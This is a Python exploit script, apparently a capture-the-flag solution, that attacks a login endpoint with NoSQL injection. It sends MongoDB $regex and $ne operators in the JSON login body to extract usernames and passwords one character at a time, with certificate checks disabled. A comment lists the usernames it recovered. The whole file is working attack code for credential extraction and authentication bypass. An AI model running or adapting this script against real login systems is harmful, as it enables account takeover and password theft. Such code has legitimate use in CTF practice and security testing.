import requests
import string
import sys
from warnings import filterwarnings
filterwarnings('ignore')

def get_password(url, charset, username):
    print("Extracting password of "+username)
    params = {"username":username, "password":{"$regex":""}}
    password = "^"
    while True:
        for c in charset:
            params["password"]["$regex"] = password + c
            pr = requests.post(url, json=params, verify=False, allow_redirects=False)
            if "home" in pr.text:
                password += c
                sys.stdout.write(f"\rPassword: {password}")
                break
        if c == charset[-1]:
            print("\rFound password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames(url, charset):
    usernames = []
    params = {"username":{"$regex":""},"password":{"$ne":"asdf"}}
    for c in charset:
        username = "^" + c
        params['username']['$regex'] = username
        pr = requests.post(url, json=params, verify=False, allow_redirects=False)
        if "home" in pr.text:
            print("\rFound username starting with "+c)
            while True:
                for c2 in charset:                    
                    params['username']['$regex'] = username + c2
                    pr = requests.post(url, json=params, verify=False, allow_redirects=False)
                    if "home" in pr.text:
                        username += c2
                        sys.stdout.write(f"\rUsername: {username}")
                        break

                if c2 == charset[-1]:
                    print("\rFound username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames

def get_password_length(url, username):
    print("Extracting password length of "+username)
    i = 0

    while True:
        params = {"username":username, "password":{"$regex":f"[a-zA-Z0-9]{{{i}}}"}}
        pr = requests.post(url, json=params, verify=False, allow_redirects=False)
        if 'home' not in pr.text:
            sys.stdout.write(f"\rPassword Length: {i-1}")
            break
        i += 1  
    
    return i-1

def main():
    url = 'https://cp.uctf.ir/login'
    charset = list(string.ascii_letters + string.digits + '.-@_{}')

    usernames = get_usernames(url, charset)
    print(usernames)
    # ['accep', 'baffling', 'decre127', 'entertainin', 'globa', 'hashishcount', 'ill', 'operaticd', 'real', 'spiralvo', 'transcendent', 'wantingconce']
    #for users in usernames:
        #get_password_length(url, users)

    # for users in usernames:
    #     get_password(url, charset, users)

if __name__ == '__main__':
    main()
